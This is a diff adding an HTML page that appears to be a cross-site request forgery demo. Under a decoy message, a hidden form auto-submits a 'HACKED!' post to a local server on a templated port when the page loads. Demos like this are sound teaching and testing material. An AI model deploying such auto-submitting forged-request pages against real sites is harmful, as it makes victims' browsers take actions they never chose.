@@ -1,0 +1,11 @@
+<p>
+    Nothing fishy happening over on <strong>Port {{port}}</strong>. Move
+    along.
+</p>
+<form id="make-post-and-run" method="POST" action="http://localhost:{{port}}/posts" class="opacity-0">
+    <input type="text" name="content" value="HACKED!" />
+</form>
+<script>
+    document.getElementById('make-post-and-run').submit();
+</script>
+<script>
